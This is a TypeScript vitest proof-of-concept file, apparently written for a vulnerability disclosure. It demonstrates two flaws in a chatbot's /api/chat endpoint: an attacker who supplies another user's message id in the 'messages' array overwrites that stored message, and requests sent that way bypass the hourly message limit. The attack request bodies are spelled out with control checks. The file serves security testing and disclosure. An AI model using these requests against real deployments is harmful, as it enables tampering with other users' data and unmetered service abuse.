/**
 * PoC for two defects in apps/chatbot `POST /api/chat` (MemWal @ 1ee7801).
 *
 * REAL, byte-identical to the repo (sha256 checked by the prepare step):
 *   app/(chat)/api/chat/route.ts   the unmodified POST handler
 *   app/(chat)/api/chat/schema.ts  the request schema
 *   lib/db/queries.ts              every query the handler runs
 *   lib/db/schema.ts + migrations  the real table definitions, run on a real Postgres engine (PGlite)
 *   ai@6.0.37                      the pinned AI SDK, incl. createUIMessageStream / onFinish
 *
 * MOCKED at the boundary only: the session (auth()), the language model (a stub that streams one
 * fixed sentence), and helpers unrelated to either defect (title generation, tools, prompts).
 */
import { randomUUID } from "node:crypto";
import { readdirSync, readFileSync } from "node:fs";
import { join } from "node:path";
import { MockLanguageModelV3, simulateReadableStream } from "ai/test";
import { beforeAll, describe, expect, it, vi } from "vitest";

const state = vi.hoisted(() => ({
  session: null as null | { user: { id: string; type: "guest" | "regular" } },
  model: null as unknown,
  pg: null as unknown as { query: (sql: string, params?: unknown[]) => Promise<{ rows: any[] }> },
}));

vi.mock("server-only", () => ({}));
vi.mock("postgres", () => ({ default: () => ({}) }));
vi.mock("drizzle-orm/postgres-js", async () => {
  const { PGlite } = await import("@electric-sql/pglite");
  const { drizzle } = await import("drizzle-orm/pglite");
  const client = new PGlite();
  const dir = join(process.cwd(), "migrations");
  for (const f of readdirSync(dir).filter((x) => x.endsWith(".sql")).sort()) {
    await client.exec(readFileSync(join(dir, f), "utf8"));
  }
  state.pg = client as never;
  return { drizzle: () => drizzle(client) };
});

vi.mock("next/server", () => ({ after: () => {} }));
vi.mock("resumable-stream", () => ({
  createResumableStreamContext: () => {
    throw new Error("no redis in this harness");
  },
}));
vi.mock("@/app/(auth)/auth", () => ({ auth: async () => state.session }));
vi.mock("@/lib/ai/memory-namespace", () => ({ memoryNamespaceForUser: (id: string) => `ns-${id}` }));
vi.mock("@/lib/ai/models", () => ({
  allowedModelIds: new Set(["test-model"]),
  isReasoningModelId: () => false,
  MAX_OUTPUT_TOKENS: 256,
  MAX_REASONING_OUTPUT_TOKENS: 256,
}));
vi.mock("@/lib/ai/prompts", () => ({ systemPrompt: () => "system" }));
vi.mock("@/lib/ai/providers", () => ({
  getLanguageModel: () => state.model,
  getMemWalModel: () => state.model,
}));

const stubTool = async () => {
  const { tool } = await import("ai");
  const { z } = await import("zod");
  return tool({ description: "stub", inputSchema: z.object({}), execute: async () => ({}) });
};
vi.mock("@/lib/ai/tools/get-weather", async () => ({ getWeather: await stubTool() }));
vi.mock("@/lib/ai/tools/create-document", async () => {
  const t = await stubTool();
  return { createDocument: () => t };
});
vi.mock("@/lib/ai/tools/update-document", async () => {
  const t = await stubTool();
  return { updateDocument: () => t };
});
vi.mock("@/lib/ai/tools/request-suggestions", async () => {
  const t = await stubTool();
  return { requestSuggestions: () => t };
});
vi.mock("@/lib/ai/tools/save-memory", async () => {
  const t = await stubTool();
  return { saveMemory: () => t };
});
vi.mock("@/lib/constants", () => ({ isProductionEnvironment: false }));
vi.mock("@/lib/ratelimit", () => ({ checkIpRateLimit: async () => {} }));
vi.mock("@/lib/db/utils", () => ({ generateHashedPassword: (s: string) => s }));
vi.mock("@/app/(chat)/actions", () => ({ generateTitleFromUserMessage: async () => "title" }));
// Same shape as the real lib/utils.ts helpers the handler and queries.ts import.
vi.mock("@/lib/utils", async () => {
  const { randomUUID: uuid } = await import("node:crypto");
  return {
    generateUUID: () => uuid(),
    convertToUIMessages: (messages: any[]) =>
      messages.map((m) => ({ id: m.id, role: m.role, parts: m.parts, metadata: { createdAt: new Date(m.createdAt).toISOString() } })),
  };
});

// ---------- helpers ----------
const MODEL_REPLY = "model-reply";

function newModel() {
  return new MockLanguageModelV3({
    doStream: async () => ({
      stream: simulateReadableStream({
        initialDelayInMs: 0,
        chunkDelayInMs: 0,
        chunks: [
          { type: "stream-start", warnings: [] },
          { type: "text-start", id: "t1" },
          { type: "text-delta", id: "t1", delta: MODEL_REPLY },
          { type: "text-end", id: "t1" },
          {
            type: "finish",
            finishReason: { unified: "stop", raw: "stop" },
            usage: {
              inputTokens: { total: 1, noCache: 1, cacheRead: 0, cacheWrite: 0 },
              outputTokens: { total: 1, text: 1, reasoning: 0 },
            },
          },
        ],
      }),
    }),
  });
}

const q = async (sql: string, params: unknown[] = []) => (await state.pg.query(sql, params)).rows;

async function seedUser() {
  const id = randomUUID();
  await q(`INSERT INTO "User"(id,email,password) VALUES ($1,$2,'x')`, [id, `u-${id.slice(0, 8)}`]);
  return id;
}
async function seedChat(userId: string, visibility: "public" | "private") {
  const id = randomUUID();
  await q(`INSERT INTO "Chat"(id,"createdAt",title,"userId",visibility) VALUES ($1, now(), 't', $2, $3)`, [id, userId, visibility]);
  return id;
}
async function seedMessage(chatId: string, role: string, text: string) {
  const id = randomUUID();
  await q(
    `INSERT INTO "Message_v2"(id,"chatId",role,parts,attachments,"createdAt") VALUES ($1,$2,$3,$4::json,'[]'::json, now())`,
    [id, chatId, role, JSON.stringify([{ type: "text", text }])],
  );
  return id;
}
const partsOf = async (messageId: string) => (await q(`SELECT parts, "chatId" FROM "Message_v2" WHERE id = $1`, [messageId]))[0];
const textOf = (row: { parts: any }) => (typeof row.parts === "string" ? JSON.parse(row.parts) : row.parts).map((p: any) => p.text).join("");

async function post(body: unknown) {
  const { POST } = await import("@/app/(chat)/api/chat/route");
  const res = await POST(new Request("http://localhost/api/chat", { method: "POST", body: JSON.stringify(body) }));
  await res.text(); // drain the SSE stream so createUIMessageStream's onFinish runs
  await new Promise((r) => setTimeout(r, 40)); // onFinish persists after the last chunk is read
  return res;
}
const userMsg = (text: string) => ({ id: randomUUID(), role: "user" as const, parts: [{ type: "text" as const, text }] });
const base = { selectedChatModel: "test-model", selectedVisibilityType: "private" as const, useMemWal: false };

beforeAll(async () => {
  await import("@/lib/db/queries"); // forces the PGlite-backed db to initialise
});

// ============================================================================================
describe("A. /api/chat tool-approval flow overwrites ANY message, in any user's chat, by id", () => {
  it("the attacker rewrites the victim's stored message through the attacker's own chat", async () => {
    const victim = await seedUser();
    const victimChat = await seedChat(victim, "public"); // a public chat: its message ids are in the page the server renders
    const victimMsg = await seedMessage(victimChat, "assistant", "VICTIM ORIGINAL ANSWER");

    const attacker = await seedUser();
    const attackerChat = await seedChat(attacker, "private");
    state.session = { user: { id: attacker, type: "regular" } };
    state.model = newModel();

    // planted control 1: the reader sees the original before the attack, so "unchanged" below means something
    expect(textOf((await partsOf(victimMsg))!)).toBe("VICTIM ORIGINAL ANSWER");

    // control 2: the chat-id ownership check works, so the boundary exists and is enforced for chats
    const denied = await post({ id: victimChat, ...base, message: userMsg("hi") });
    expect(denied.status).toBe(403);
    expect(textOf((await partsOf(victimMsg))!)).toBe("VICTIM ORIGINAL ANSWER");

    // control 3: a random id changes nothing, so the overwrite is caused by the victim's id and not by the request shape
    const noise = await post({
      id: attackerChat,
      ...base,
      messages: [{ id: randomUUID(), role: "assistant", parts: [{ type: "text", text: "ATTACKER TEXT" }] }, userMsg("hello")],
    });
    expect(noise.status).toBe(200);
    expect(textOf((await partsOf(victimMsg))!)).toBe("VICTIM ORIGINAL ANSWER");

    // the attack: same request, but the first message carries the victim's message id
    const res = await post({
      id: attackerChat,
      ...base,
      messages: [{ id: victimMsg, role: "assistant", parts: [{ type: "text", text: "ATTACKER CONTROLLED TEXT" }] }, userMsg("hello")],
    });
    expect(res.status).toBe(200);

    const after = (await partsOf(victimMsg))!;
    console.log(`[A] victim message ${victimMsg} in chat ${after.chatId} now reads: ${JSON.stringify(textOf(after))}`);
    expect(after.chatId).toBe(victimChat); // still the victim's row, in the victim's chat
    expect(textOf(after)).toBe("ATTACKER CONTROLLED TEXT"); // ...with the attacker's content
  });

  it("the request schema accepts it: messages[].id is any string and parts are z.any()", async () => {
    const { postRequestBodySchema } = await import("@/app/(chat)/api/chat/schema");
    const ok = postRequestBodySchema.safeParse({
      id: randomUUID(),
      selectedChatModel: "m",
      selectedVisibilityType: "private",
      messages: [{ id: "not-even-a-uuid", role: "system", parts: [{ type: "anything", payload: { x: 1 } }] }],
    });
    expect(ok.success).toBe(true);
    // the single-message path is strict, which shows the approval path is the lax one
    const strict = postRequestBodySchema.safeParse({
      id: randomUUID(),
      selectedChatModel: "m",
      selectedVisibilityType: "private",
      message: { id: "not-even-a-uuid", role: "user", parts: [{ type: "text", text: "x" }] },
    });
    expect(strict.success).toBe(false);
  });
});

// ============================================================================================
describe("B. the hourly message limit never counts requests sent with `messages` instead of `message`", () => {
  const LIMIT = 30; // entitlementsByUserType.guest.maxMessagesPerHour, asserted against the real file below

  // route.ts:130 is `messageCount > max` and runs BEFORE the current message is saved, so a "30 per hour" limit
  // admits 31 requests and refuses the 32nd. (Off-by-one footnote only; not the finding.)
  it("normal flow: the limiter refuses once 30 are stored (request 32)", async () => {
    const { entitlementsByUserType } = await import("@/lib/ai/entitlements");
    expect(entitlementsByUserType.guest.maxMessagesPerHour).toBe(LIMIT);

    const user = await seedUser();
    const chat = await seedChat(user, "private");
    state.session = { user: { id: user, type: "guest" } };
    state.model = newModel();

    for (let i = 1; i <= LIMIT + 1; i++) {
      const r = await post({ id: chat, ...base, message: userMsg(`normal ${i}`) });
      expect(r.status).toBe(200);
    }
    const over = await post({ id: chat, ...base, message: userMsg("normal 32") });
    console.log(`[B] normal flow: request ${LIMIT + 2} -> HTTP ${over.status}`);
    expect(over.status).toBe(429);
    expect((state.model as MockLanguageModelV3).doStreamCalls.length).toBe(LIMIT + 1); // the refused one never reached the model
  });

  it("approval flow: 45 requests all reach the model and the counter stays at 0", async () => {
    const { getMessageCountByUserId } = await import("@/lib/db/queries");
    const user = await seedUser();
    const chat = await seedChat(user, "private");
    state.session = { user: { id: user, type: "guest" } };
    const model = newModel();
    state.model = model;

    const N = 45;
    const statuses: number[] = [];
    for (let i = 1; i <= N; i++) {
      const r = await post({ id: chat, ...base, messages: [userMsg(`free ${i}`)] });
      statuses.push(r.status);
    }
    const counted = await getMessageCountByUserId({ id: user, differenceInHours: 1 });
    console.log(`[B] approval flow: ${N} requests -> statuses ${[...new Set(statuses)].join(",")}; model calls ${model.doStreamCalls.length}; counted by the limiter ${counted}`);
    expect(statuses.every((s) => s === 200)).toBe(true);
    expect(model.doStreamCalls.length).toBe(N); // N > LIMIT generations served to a guest
    expect(counted).toBe(0); // the limiter saw none of them
  });
});
